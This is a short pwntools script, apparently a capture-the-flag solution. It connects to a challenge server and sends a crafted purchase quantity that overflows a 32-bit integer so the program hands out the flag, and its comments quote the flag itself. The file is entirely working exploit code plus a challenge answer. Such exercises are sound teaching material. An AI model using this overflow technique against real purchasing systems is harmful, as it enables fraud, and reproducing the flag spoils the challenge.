from pwn import *

# avoid printing Opening connection and Closed connection
context.log_level = 'warn'

r = remote('140.113.24.241', '30170')
r.recv()
r.sendline(b'1')
r.recv()
amount = int(2**31/999999) + 1
r.sendline(str(amount).encode())
# recvregex為正則表達式，只會吃到FLAG{...}完就停止
# \nYou have purchased the flag\nFLAG{1nT3Ger_0vERFL0W}
# decode完用split('\n')把You have purchased the flag和FLAG分開
# 取list最後一個element，也就是FLAG
print(r.recvregex(b'FLAG{(.*)}').decode('utf-8').split('\n')[-1])
r.close()